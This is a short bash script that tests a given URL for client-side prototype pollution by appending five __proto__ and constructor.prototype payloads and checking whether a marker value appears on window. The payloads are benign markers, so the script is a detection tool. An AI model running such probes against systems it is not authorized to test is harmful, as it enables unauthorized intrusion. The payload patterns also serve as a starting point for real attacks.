#!/bin/bash

payloads=("#__proto__[testparam]=testval" "?__proto__.testparam=testval" "?__proto__[testparam]=testval" "?constructor.prototype.testparam=testval" "?constructor[prototype][testparam]=testval")


for i in "${payloads[@]}"
do
    echo $1$i | page-fetch -j 'window.testparam == "testval"? "vulnerable" : "not vulnerable"' | grep ^JS
done
